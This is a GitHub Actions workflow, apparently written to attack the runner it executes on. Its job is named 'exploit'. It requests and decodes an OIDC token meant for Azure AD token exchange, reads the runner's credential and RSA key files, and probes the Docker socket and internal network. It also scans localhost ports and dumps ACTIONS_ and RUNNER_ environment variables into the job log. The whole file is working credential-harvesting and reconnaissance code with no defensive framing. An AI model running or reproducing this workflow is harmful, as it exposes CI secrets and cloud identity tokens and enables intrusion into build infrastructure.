name: Nuclear Test v2
on: workflow_dispatch
permissions:
  id-token: write
  contents: read
  actions: read
jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: oidc-token-test
        run: |
          echo "=== OIDC TOKEN REQUEST ==="
          echo "URL: $ACTIONS_ID_TOKEN_REQUEST_URL"
          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
            RESP=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" 2>&1)
            echo "Response type: $(echo $RESP | python3 -c 'import sys,json; d=json.loads(sys.stdin.read()); print(type(d).__name__, list(d.keys()))' 2>&1)"
            echo "$RESP" | python3 -c "
import sys,json,base64
try:
    data=json.loads(sys.stdin.read())
    if 'value' in data:
        parts=data['value'].split('.')
        if len(parts)>=2:
            padding='='*(4-len(parts[1])%4)
            decoded=base64.urlsafe_b64decode(parts[1]+padding)
            claims=json.loads(decoded)
            for k,v in claims.items():
                print(f'  CLAIM {k}: {v}')
    else:
        print(f'  No value key. Keys: {list(data.keys())}')
        for k,v in data.items():
            print(f'  {k}: {str(v)[:100]}')
except Exception as e:
    print(f'  Parse error: {e}')
"
          else
            echo "No OIDC URL"
          fi
          
      - name: runner-intel
        run: |
          echo "=== RUNNER REGISTRATION ==="
          cat /home/runner/.runner 2>/dev/null || echo "No .runner file"
          echo "=== RUNNER CREDENTIALS ==="
          ls -la /home/runner/.credentials* 2>/dev/null || echo "No credentials"
          cat /home/runner/.credentials 2>/dev/null || echo "Cannot read credentials"
          echo "=== RSA PARAMS ==="
          ls -la /home/runner/.credentials_rsaparams 2>/dev/null
          echo "=== NETWORK ==="
          ip route 2>/dev/null | head -5
          echo "=== DOCKER SOCKET ==="
          ls -la /var/run/docker.sock 2>/dev/null || echo "No docker socket"
          docker info 2>/dev/null | head -10 || echo "Docker not accessible"
          echo "=== INTERNAL SERVICES ==="
          ss -tlnp 2>/dev/null | head -10 || netstat -tlnp 2>/dev/null | head -10
          echo "=== ARP TABLE ==="
          ip neigh 2>/dev/null | head -10
          echo "=== GITHUB INTERNAL ENDPOINTS ==="
          curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/ 2>/dev/null && echo " - localhost:8080 accessible!" || echo "localhost:8080 - closed"
          for port in 3000 8080 8443 9090 443 80; do
            curl -s -o /dev/null -w "%{http_code}" --connect-timeout 1 http://127.0.0.1:$port/ 2>/dev/null && echo " - 127.0.0.1:$port accessible!" || true
          done
          echo "=== ACTIONS RUNNER SERVICE ==="
          cat /home/runner/.service 2>/dev/null || echo "No service file"
          echo "=== GITHUB ACTIONS INTERNAL ENV ==="
          env | grep -i "ACTIONS_" | head -20
          env | grep -i "RUNNER_" | head -10
          echo "=== DONE ==="
